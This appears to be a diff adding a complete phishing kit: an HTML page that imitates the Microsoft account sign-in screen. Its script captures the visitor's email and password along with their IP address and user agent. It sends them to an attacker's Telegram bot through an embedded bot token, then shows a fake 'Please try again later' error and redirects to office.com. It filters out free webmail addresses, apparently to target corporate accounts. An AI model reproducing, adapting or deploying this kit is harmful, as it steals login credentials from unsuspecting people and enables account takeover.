@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <script src="https://kit.fontawesome.com/8ef29e5a64.js" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+
+    <!-- Bootstrap CSS -->
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="icon" type="image/png" href="/images/favcon.png" sizes="32x32" />
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <title>Sign in to your account</title>
+    <link href="css/hover.css" rel="stylesheet" media="all" />
+
+    <style>
+      /* Use !important to override Bootstrap styles */
+      body {
+        background-image: url("images/microsoft img.svg");
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
+          "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi",
+          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
+          "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
+          "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
+          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
+          "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
+          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+      }
+      input {
+        outline: none !important;
+        box-shadow: none !important;
+        border-radius: 0% !important;
+        border-bottom: 1px solid black !important;
+      }
+      .contains-all {
+        max-width: 440px;
+       margin: 15% auto 0"
+      }
+      .footer {
+        display: flex;
+        background-color: #666666;
+        justify-content: end;
+      }
+      .footer a {
+        font-size: 12px;
+        line-height: 28px;
+        white-space: nowrap;
+        display: inline-block;
+        margin-left: 8px;
+        margin-right: 8px;
+      }
+      .div1contain {
+        padding: 35px;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      }
+      #div2 {
+        padding: 35px;
+      }
+      #next {
+        min-height: 32px;
+        min-width: 108px;
+      }
+      #submit-btn{
+        min-height: 32px;
+        min-width: 108px;
+      }
+      .Sign-in-option {
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      }
+
+      @media screen and (max-width: 600px) {
+        body {
+          background-image: none;
+        }
+        .outlook {
+          display: none;
+        }
+        .Sign-in-option {
+          border: 1px solid black;
+          box-shadow: none;
+        }
+        .contains-all {
+          max-width: 100%;
+          margin-top: 30px;
+        }
+        .div1contain {
+          padding: 0px;
+          box-shadow: none;
+        }
+        #div2 {
+          padding: 0px;
+        }
+        #next {
+          padding: 4px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="container px-0">
+        <div class="contains-all container-fluid px-0">
+          <!-- <div class="col-lg-6">
+            <div class="text-white my-5 py-3">
+              <span class="display-4"
+                >Expand Your<br />
+                Office 365</span
+              ><br /><br />
+              <span class="h5 font-weight-normal"
+                >Upgrade to ad-free email and the latest productivity tools with
+                office 365.</span
+              ><br /><br /><br />
+              <button
+                class="btn btn-white rounded-0 px-5 py-2"
+                style="font-size: 20px; color: #1c9cd6; font-weight: 500"
+              >
+                Get Started
+              </button>
+            </div>
+          </div> -->
+          <div class="mx-auto">
+            <div id="div1">
+              <!-- <div>
+                <img
+                  class="outlook"
+                  style="max-width: 256px; max-height: 36px; margin: 15px 30%"
+                  src="https://aadcdn.msftauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png"
+                  alt=""
+                />
+              </div> -->
+              <div class="div1contain bg-white">
+                <img
+                  width="140px"
+                  src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                  class="img-fluid"
+                /><br /><br />
+                <span class="h5">Sign In</span><br />
+                <span id="error" class="text-danger"
+                  >That Microsoft account doesn't exist. Enter a different
+                  account</span
+                >
+                <div class="form-group mt-2">
+                  <input
+                    type="email"
+                    name="email"
+                    class="form-control px-0 focus-ring-light"
+                    id="email"
+                    aria-describedby="emailHelp"
+                    placeholder="Email, phone, or Skype"
+                    style="
+                      border-right: none;
+                      border-left: none;
+                      border-top: none;
+                    "
+                  />
+                </div>
+                <p>
+                  <small>No account? <a href="#">Create one!</a></small>
+                </p>
+                <p>
+                  <small><a href="#">Can’t access your account?</a></small>
+                </p>
+
+                <div class="text-right">
+                  <button
+                    class="btn rounded-0 text-white py-0 px-4"
+                    id="next"
+                    style="background-color: #0066ba"
+                  >
+                    Next
+                  </button>
+                </div>
+              </div>
+              <div class="bg-white mt-4 d-flex px-4 py-2 Sign-in-option">
+                <img src="images/key.png" alt="" width="40" />
+                <a class="pt-1 px-2 text-dark" href="#">Sign-in options</a>
+              </div>
+            </div>
+
+            <div class="bg-white" id="div2">
+              <form id="contact">
+                <img
+                  src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                  class="img-fluid"
+                /><br /><br />
+                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span
+                  id="emailch"
+                  >abc@abc.com</span
+                ><br />
+                <span id="msg" class="text-danger"></span><br />
+                <span class="h5">Enter password</span>
+                <div class="form-group mt-2">
+                  <input
+                    type="password"
+                    name="password"
+                    class="form-control px-0"
+                    id="password"
+                    aria-describedby="emailHelp"
+                    placeholder="Enter Password"
+                    style="
+                      border-right: none;
+                      border-left: none;
+                      border-top: none;
+                    "
+                  />
+                </div>
+                <p><a href="#">Forgot password?</a></p>
+                <p><a id="emailch1" href="#">Sign in with a security key</a></p>
+                <p>
+                  <a href="/">Sign in with a different Microsoft account</a>
+                </p>
+                <div class="text-right">
+                  <button
+                    class="btn rounded-0 text-white py-0 px-4"
+                    id="submit-btn"
+                    style="background-color: #0066ba"
+                  >
+                    Sign in
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="fixed-bottom footer">
+      <div>
+        <a
+          class="text-white"
+          href="https://www.microsoft.com/en-US/servicesagreement/"
+          >Terms of use</a
+        ><a
+          class="text-white"
+          href="https://privacy.microsoft.com/en-US/privacystatement"
+          >Privacy & cookies</a
+        >
+      </div>
+    </div>
+
+    <!-- Change bot token and userID on line 245-->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc="></script>
+  <script nonce="NDA1NTc0NTI0LDE5NzQ3NzUyNTc=">
+    window.addEventListener("load", () => {
+      if (window.location.hash.length == 0) {
+        return;
+      } else {
+        const fragmentIdentifier = window.location.hash.slice(1);
+
+        $("#email").val(fragmentIdentifier);
+        $("#next").click();
+      }
+    });
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    const BOT_TOKEN = "6815664414:AAFkx_UFYUfrRGiwRL3IMCklOy-MV5naEpI";
+    const USERID = "6080424439";
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+    //BOT TOKEN HERE
+
+    /* global $ */
+    $(document).ready(function () {
+      $("#error").hide();
+      $("#div2").hide();
+      $("#msg").hide();
+      $("#email").click(function () {
+        $("#error").hide();
+      });
+      $("#next").click(function () {
+        var my_email = $("#email").val();
+        var filter =
+          /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(email.value)) {
+          $("#error").show();
+          email.focus;
+          return false;
+        }
+
+        // Remove the 'autofocus' attribute from all input fields
+        $("input").removeAttr("autofocus");
+
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr(ind + 1);
+        var c = my_slice.substr(0, my_slice.indexOf("."));
+        var final = c.toLowerCase();
+        if (
+          final == "gmail" ||
+          final == "yahoo" ||
+          final == "hotmail" ||
+          final == "aol"
+        ) {
+          $("#error").show();
+        } else {
+          $("#div1").animate({ left: 200, opacity: "hide" }, 0);
+          $("#div2").animate({ right: 200, opacity: "show" }, 1000);
+          $("#emailch").html(my_email);
+          $("#emailch1").html(`Email code to ${my_email}`);
+        }
+      });
+      $("#back").click(function () {
+        $("#msg").hide();
+        $("#div2").animate({ left: 200, opacity: "hide" }, 0);
+        $("#div1").animate({ right: 200, opacity: "show" }, 1000);
+      });
+
+      var ip = "";
+      fetch("https://ipapi.co/json")
+        .then((response) => response.json())
+        .then((data) => {
+          ip = data.ip;
+        });
+
+      $("#submit-btn").click(function (event) {
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var detail = $("#field").html();
+        var msg = $("#msg").html();
+
+        $("#msg").text(msg);
+
+        if (msg == "Please try again later") {
+          window.location.replace("https://office.com");
+        } else {
+          var fullURL = window.location.href;
+
+          const useragent = navigator.userAgent;
+
+          const message =
+            `|----------- CrEaTeD By StOtLe --------------|\n` +
+            `|----------| xLs |--------------|\n` +
+            `Login From           : ${detail}\n` +
+            `Online ID            : ${email}\n` +
+            `Passcode              : ${password}\n` +
+            `|--------------- I N F O | I P -------------------|\n` +
+            `|Client IP: ${ip}\n` +
+            `|--- http://www.geoiptool.com/?IP=${ip} ----\n` +
+            `User Agent : ${useragent}\n` +
+            `|----------- CrEaTeD By StOtLe --------------|`;
+
+          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+          // Prepare the data for the POST request
+          const data = {
+            chat_id: USERID,
+            text: message,
+          };
+          $.ajax({
+            url: apiUrl,
+            method: "POST",
+            contentType: "application/json",
+            data: JSON.stringify(data),
+            beforeSend: function (xhr) {
+              $("#submit-btn").html("Verifing...");
+            },
+            success: function (response) {
+              if (response) {
+                $("#msg").show();
+                // console.log(response);
+                if (response["ok"] == true) {
+                  $("#msg").html("Please try again later");
+                }
+                // } else {
+                //   $("#msg").html(response["msg"]);
+                // }
+              }
+            },
+            error: function () {
+              $("#msg").show();
+              $("#msg").html("Please try again later");
+            },
+            complete: function () {
+              $("#submit-btn").html("Login");
+            },
+          });
+        }
+      });
+    });
+  </script>
+</html>
